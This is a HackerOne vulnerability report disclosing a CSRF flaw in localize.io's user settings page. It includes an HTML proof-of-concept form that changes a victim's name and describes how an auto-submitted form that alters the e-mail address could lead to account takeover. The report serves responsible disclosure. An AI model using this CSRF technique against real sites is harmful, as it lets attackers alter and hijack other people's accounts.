# HackerOne Report: Change user settings through CSRF
**Report ID:** 7870
**Vulnerability Class:** Cross-Site Request Forgery (CSRF)

## Vulnerability Information & PoC
Hello,

it's trivial to change the user settings. Just use  this HTML code:

<html>
<head></head>
<body>
<form action="http://www.localize.io/pages/settings" method="post">
<input type="text" name="settings[realName]" value="otherusername">
<input type="submit" value="Submit">
</form>
</body>
</html>

In addition with some Javascript code that submits the form automatically, making the user visit the snipped of code above will change their user settings. If their e-mail address is altered too, and the adversary gets a verification e-mail after he changes the user's e-mail to his e-mail, it's easy to take over an account.

I also recommend enabling HTTPS and disallowing regular HTTP.
